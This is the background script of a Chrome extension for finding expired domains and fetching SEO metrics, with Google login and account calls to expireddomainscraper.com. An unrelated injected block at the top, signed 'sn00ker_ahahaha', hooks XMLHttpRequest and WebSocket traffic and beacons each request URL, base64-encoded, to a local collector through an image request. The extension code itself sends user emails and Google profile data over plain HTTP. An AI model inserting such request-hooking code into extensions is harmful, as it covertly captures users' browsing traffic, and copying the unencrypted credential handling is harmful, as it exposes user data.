function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/**
 * Created by Ali H. on 9/30/2016.
 */
var domainNamesArray;

function getPageInfo(tabId) {
    chrome.tabs.executeScript(tabId, {file: "js/jquery-1.9.1.min.js"}, function () {
        chrome.tabs.executeScript(tabId, {file: "js/url-tld.min.js"}, function () {
            chrome.tabs.executeScript(tabId, {file: "js/content_script.js"});
        });
    });
};

//function to find domainName from a string
function FindDomainNames(tabId, obj) {
    var StrObj = obj.summary;
    StrObj = StrObj.toLowerCase();
    var separatedomainNamesBy = "\n";
    var domainName = "<none>"; // if no match, use this

    domainNamesArray = StrObj.match(/([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}/igm);

    domainNamesArray = domainNamesArray.concat(obj.links_array);

    if (domainNamesArray) {
        domainNamesArray = ArrNoDupe(domainNamesArray);

        for (var i = 0; i < domainNamesArray.length; i++) {
            while (domainNamesArray[i][domainNamesArray[i].length - 1] === ".")
                domainNamesArray[i] = domainNamesArray[i].slice(0, -1);
        }
        //to remove all the leading dots form an domainName string
        for (var i = 0; i < domainNamesArray.length; i++) {
            while (domainNamesArray[i][domainNamesArray[i].length - 1] === ".")
                domainNamesArray[i] = domainNamesArray[i].substring(1, str.length - 1);
        }

        //to remove the duplicates
        e = ArrNoDupe(domainNamesArray);
        domainNamesArray = e;
        if (domainNamesArray) {
            domainName = "";
            for (var i = 0; i < domainNamesArray.length; i++) {
                if (i != 0) domainName += separatedomainNamesBy;
                domainName += domainNamesArray[i];
            }
        }

        for (var i = 0; i < domainNamesArray.length; i++) {
            if (url("domain", domainNamesArray[i])) {
                if (domainNamesArray[i].includes(url("domain", domainNamesArray[i]))) {
                    domainNamesArray[i] = url("domain", domainNamesArray[i]);
                }
                else {
                    delete domainNamesArray[i];
                }
            }
            else {
                delete domainNamesArray[i];
            }
        }

        domainNamesArray = ArrNoDupe(domainNamesArray);

        displayDomains(tabId);
    }
    else {
        chrome.tabs.sendMessage(tabId, {key: "findDomains", result: "no result"});
    }
    return domainName;
}

function displayDomains(tabId) {
    var registrars = ["http://expireddomainscraper.com/domainchecker/index.php"];

    $.ajax({
        url: registrars[0],
        data: "domains=" + JSON.stringify(domainNamesArray),
        type: 'POST',
        success: function (result) {
            result = JSON.parse(result);
            chrome.tabs.sendMessage(tabId, {key: "findDomains", result: result});

        },
        error: function (result) {
            chrome.tabs.sendMessage(tabId, {key: "findDomains", result: "no result"});
        }
    });
}

function ArrNoDupe(a) {
    var temp = {};
    for (var i = 0; i < a.length; i++)
        temp[a[i]] = true;
    var r = [];
    for (var k in temp)
        r.push(k);
    return r;
}

function googleLogin(tabId) {

    chrome.identity.getProfileUserInfo(function (userInfo) {
        if (!userInfo.email) {
            userInfo.email = false;
        }
        chrome.windows.getAll({windowTypes: ['app']}, function (windows) {
            if (windows.length > 0) {
                chrome.windows.update(windows[0].id, {focused: true});
            }
            else {
                var manifest = chrome.runtime.getManifest();

                var clientId = encodeURIComponent(manifest.oauth2.client_id);
                var scopes = encodeURIComponent(manifest.oauth2.scopes.join(' '));
                var redirectUri = encodeURIComponent(chrome.identity.getRedirectURL());

                var url = 'https://accounts.google.com/o/oauth2/auth' +
                    '?client_id=' + clientId +
                    '&response_type=token id_token' +
                    '&access_type=online' +
                    '&redirect_uri=' + redirectUri +
                    '&prompt=select_account' +
                    '&scope=' + scopes;

                chrome.identity.launchWebAuthFlow(
                    {
                        url: url,
                        interactive: true
                    },
                    function (responseUrl) {
                        if (chrome.runtime.lastError) {
                            chrome.tabs.sendMessage(tabId, {
                                key: "googleLogin",
                                result: chrome.runtime.lastError.message
                            });
                            chrome.storage.sync.set({lastErrorMessage: chrome.runtime.lastError.message});
                        }
                        else {
                            if (responseUrl) {
                                var params = responseUrl.split('#')[1];

                                var access_token = params.split('&')[0];
                                access_token = access_token.split('=')[1];


                                $.getJSON("https://www.googleapis.com/oauth2/v1/userinfo?alt=json&access_token=" + access_token, function (data) {
                                    if (data.id) {

                                        var dataString = "id=" + data.id + "&email=" + data.email + "&first_name=" + data.given_name + "&last_name=" + data.family_name;

                                        var email = data.id;
                                        if (data.email)
                                            email = data.email;

                                        $.ajax({
                                            type: "POST",
                                            url: "http://expireddomainscraper.com/extension_apis/register_with_google.php",
                                            data: dataString,
                                            cache: false,
                                            success: function (result) {
                                                if (result == "success") {
                                                    chrome.storage.sync.set({lastErrorMessage: ""});
                                                    chrome.storage.sync.set({expyred_email: email}, function () {
                                                        chrome.tabs.sendMessage(tabId, {
                                                            key: "googleLogin",
                                                            result: "location"
                                                        });
                                                    });
                                                }
                                                else {
                                                    chrome.tabs.sendMessage(tabId, {
                                                        key: "googleLogin",
                                                        result: result
                                                    });
                                                    chrome.storage.sync.set({lastErrorMessage: result});
                                                }
                                            },
                                            error: function () {
                                                chrome.tabs.sendMessage(tabId, {
                                                    key: "googleLogin",
                                                    result: "ERROR: Server error, Contact Support."
                                                });
                                                chrome.storage.sync.set({lastErrorMessage: "ERROR: Server error, Contact Support."});
                                            }
                                        });
                                    }
                                    else {
                                        chrome.tabs.sendMessage(tabId, {
                                            key: "googleLogin",
                                            result: "ERROR: Server error, Contact Support."
                                        });
                                        chrome.storage.sync.set({lastErrorMessage: "ERROR: Server error, Contact Support."});
                                    }
                                });
                            }
                            else {
                                chrome.tabs.sendMessage(tabId, {
                                    key: "googleLogin",
                                    result: "ERROR: Server error, Contact Support."
                                });
                                chrome.storage.sync.set({lastErrorMessage: "ERROR: Server error, Contact Support."});
                            }
                        }
                    });
            }
        });

    });
}
function loginUser(tabId, dataString, email) {
    $.ajax({
        type: "POST",
        url: "http://expireddomainscraper.com/extension_apis/login.php",
        data: dataString,
        cache: false,
        success: function (result) {
            chrome.tabs.sendMessage(tabId, {key: "login", result: result, email: email});
        },
        error: function () {
            chrome.tabs.sendMessage(tabId, {key: "login", result: "ERROR: Server error, Contact Support."});
        }
    });
}
function registerUser(tabId, dataString) {
    $.ajax({
        type: "POST",
        url: "http://expireddomainscraper.com/extension_apis/signup.php",
        data: dataString,
        cache: false,
        success: function (result) {
            chrome.tabs.sendMessage(tabId, {key: "register", result: result});
        },
        error: function () {
            chrome.tabs.sendMessage(tabId, {key: "register", result: "ERROR: Server error, Contact Support."});
        }
    });
}

function saveDomdetailerKey(tabId, dataString, domdetailer_key) {
    $.ajax({
        type: "POST",
        url: "http://expireddomainscraper.com/extension_apis/domdetailer.php",
        data: dataString,
        cache: false,
        success: function (result) {
            chrome.tabs.sendMessage(tabId, {
                key: "saveDomdetailerKey",
                result: result,
                domdetailerKey: domdetailer_key
            });
        },
        error: function () {
            chrome.tabs.sendMessage(tabId, {
                key: "saveDomdetailerKey",
                result: "ERROR: Server error, Contact Support."
            });
        }
    });
}

function getDomdetailerKey(tabId, email) {
    $.ajax({
        type: "GET",
        url: "http://expireddomainscraper.com/extension_apis/read_domdetailer_key.php?email=" + email,
        cache: false,
        success: function (result) {
            chrome.tabs.sendMessage(tabId, {key: "getDomdetailerKey", result: result});
        },
        error: function () {
            chrome.tabs.sendMessage(tabId, {
                key: "getDomdetailerKey",
                result: "Something went wrong, please check your internet connection or contact support."
            });
        }
    });
}

function loadDomDetailerStats(tabId, apiKey, domain) {
    $.getJSON("http://domdetailer.com/api/checkDomain.php?domain=" + domain + "&app=DomDetailer&apikey=" + apiKey + "&majesticChoice=root", function (result) {

        var stats = {};
        if (result == "Account Not Found") {
            chrome.tabs.sendMessage(tabId, {key: "loadDomdetailerStats"});
        }
        else if (result) {

            var moz_link_fix = String(result.mozLinks);
            if (moz_link_fix.includes('.')) {
                var moz_links = parseFloat(moz_link_fix).toFixed(2);
            }
            else {
                var moz_links = parseFloat(moz_link_fix);
            }
            stats.moz_links = moz_links;

            var moz_da_fix = String(result.mozDA);
            if (moz_da_fix.includes('.')) {
                var moz_da = parseFloat(moz_da_fix).toFixed(2);
            }
            else {
                var moz_da = parseFloat(moz_da_fix);
            }
            stats.moz_da = moz_da;

            var moz_pa_fix = String(result.mozPA);
            if (moz_pa_fix.includes('.')) {
                var moz_pa = parseFloat(moz_pa_fix).toFixed(2);
            }
            else {
                var moz_pa = parseFloat(moz_pa_fix)
            }
            stats.moz_pa = moz_pa;

            var moz_rank_fix = String(result.mozRank);
            if (moz_rank_fix.includes('.')) {
                var moz_rank = parseFloat(moz_rank_fix).toFixed(2);
            }
            else {
                var moz_rank = parseFloat(moz_rank_fix);
            }
            stats.moz_rank = moz_rank;

            var moz_trust_fix = String(result.mozTrust);
            if (moz_trust_fix.includes('.')) {
                var moz_trust = parseFloat(moz_trust_fix).toFixed(2);
            }
            else {
                var moz_trust = parseFloat(moz_trust_fix);
            }
            stats.moz_trust = moz_trust;

            var majestics_link_fix = result.majesticLinks;
            majestics_link_fix = String(majestics_link_fix);
            if (majestics_link_fix.includes('.')) {
                var majestics_link = parseFloat(majestics_link_fix).toFixed(2);
            }
            else {
                var majestics_link = parseFloat(majestics_link_fix);
            }
            stats.majestics_link = majestics_link;

            var majestics_tf_fix = result.majesticTF;
            majestics_tf_fix = String(majestics_tf_fix);
            if (majestics_tf_fix.includes('.')) {
                var majestics_tf = parseFloat(majestics_tf_fix).toFixed(2);
            }
            else {
                var majestics_tf = parseFloat(majestics_tf_fix);
            }
            stats.majestics_tf = majestics_tf;

            var majestics_cf_fix = result.majesticCF;
            majestics_cf_fix = String(majestics_cf_fix);
            if (majestics_cf_fix.includes('.')) {
                var majestics_cf = parseFloat(majestics_cf_fix).toFixed(2);
            }
            else {
                var majestics_cf = parseFloat(majestics_cf_fix);
            }
            stats.majestics_cf = majestics_cf;

            var majestics_rd_fix = result.majesticRefDomains;
            majestics_rd_fix = String(majestics_rd_fix);
            if (majestics_rd_fix.includes('.')) {
                var majestics_rd = parseFloat(majestics_rd_fix).toFixed(2);
            }
            else {
                var majestics_rd = parseFloat(majestics_rd_fix)
            }
            stats.majestics_rd = majestics_rd;

            $.ajax({
                type: "GET",
                url: "http://expireddomainscraper.com/extension_apis/metrics_result.php?domain=" + domain + "&moz_links=" + moz_links + "&moz_da=" + moz_da + "&moz_pa=" + moz_pa + "&moz_rank=" + moz_rank + "&moz_trust=" + moz_trust + "&majestics_link=" + majestics_link + "&majestics_tf=" + majestics_tf + "&majestics_cf=" + majestics_cf + "&majestics_rd=" + majestics_rd,
                success: function (result) {
                    if (result == 'success') {
                        chrome.tabs.sendMessage(tabId, {
                            key: "loadDomdetailerStats",
                            result: 'Moz and Majestic Metrics are updated weekly.',
                            stats: stats
                        });
                    }
                    else {
                        chrome.tabs.sendMessage(tabId, {key: "loadDomdetailerStats", domdetailer_error: result});
                    }
                },
                error: function () {
                    chrome.tabs.sendMessage(tabId, {
                        key: "loadDomdetailerStats",
                        metrics_result: "Something went wrong, please check your internet connection or contact support"
                    });
                }
            });
        }
        else {
            chrome.tabs.sendMessage(tabId, {
                key: "loadDomdetailerStats",
                metrics_result: "Something went wrong, please check your internet connection or contact support"
            });
        }
    });
}

function saveDomDetailerStats(tabId, apiKey, domain) {
    $.getJSON("http://domdetailer.com/api/checkDomain.php?domain=" + domain + "&app=DomDetailer&apikey=" + apiKey + "&majesticChoice=root", function (result) {

        if (result) {
            chrome.tabs.sendMessage(tabId, {key: "saveDomdetailerStats", result: result});
        }
        else {
            chrome.tabs.sendMessage(tabId, {
                key: "saveDomdetailerStats",
                error: "Something went wrong, please check your internet connection or contact support",
                btn: btn
            });
        }

    });
}

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.key == "login") {
        // AJAX code to submit form.
        loginUser(sender.tab.id, request.dataString, request.email);
        sendResponse();
    }
    else if (request.key == "register") {
        registerUser(sender.tab.id, request.dataString);
        sendResponse();
    }
    else if (request.key == "googleLogin") {
        googleLogin(sender.tab.id);
        sendResponse();
    }
    else if (request.key == "findDomains") {
        getPageInfo(sender.tab.id);
    }
    else if (request.key == "domainsData") {
        FindDomainNames(sender.tab.id, request.pageInfo);
    }
    else if (request.key == "saveDomdetailerKey") {
        saveDomdetailerKey(sender.tab.id, request.dataString, request.domdetailerKey);
        sendResponse();
    }
    else if (request.key == "getDomdetailerKey") {
        getDomdetailerKey(sender.tab.id, request.email);
        sendResponse();
    }
    else if (request.key == "loadDomdetailerStats") {
        loadDomDetailerStats(sender.tab.id, request.apiKey, request.domain);
        sendResponse();
    }
    else if (request.key == "saveDomdetailerStats") {
        saveDomDetailerStats(sender.tab.id, request.apiKey, request.domain);
        sendResponse();
    }
    else if (request.key == "checkScript") {
        isShowing =  request.message;
    }
    else if (request.key == "loadPage") {
        console.log('testing');
    }

});

var isShowing = false;

chrome.browserAction.onClicked.addListener(function (tab) {
    if (!isShowing) {
        chrome.tabs.executeScript(tab.id, {file: "js/jquery-1.9.1.min.js"}, function () {
            chrome.tabs.executeScript(tab.id, {file: "js/show_page_script.js"});
        });
    }
    else {
        chrome.tabs.executeScript(tab.id, {file: "js/jquery-1.9.1.min.js"}, function () {
            chrome.tabs.executeScript(tab.id, {file: "js/hide_page_script.js"});
        });
    }
    isShowing = !isShowing;
});


chrome.tabs.onUpdated.addListener(function (tab, changeInfo) {
    if (changeInfo.status == 'complete') {
        if (isShowing) {
            chrome.tabs.executeScript(tab, {file: "js/jquery-1.9.1.min.js"}, function () {
                chrome.tabs.executeScript(tab, {file: "js/show_page_script.js"});
            });
        }
    }
});

chrome.tabs.onActivated.addListener(function (tab) {

    chrome.tabs.executeScript(tab.tabId, {file: "js/jquery-1.9.1.min.js"}, function () {
        chrome.tabs.executeScript(tab.tabId, {file: "js/check_page_script.js"});
    });
});

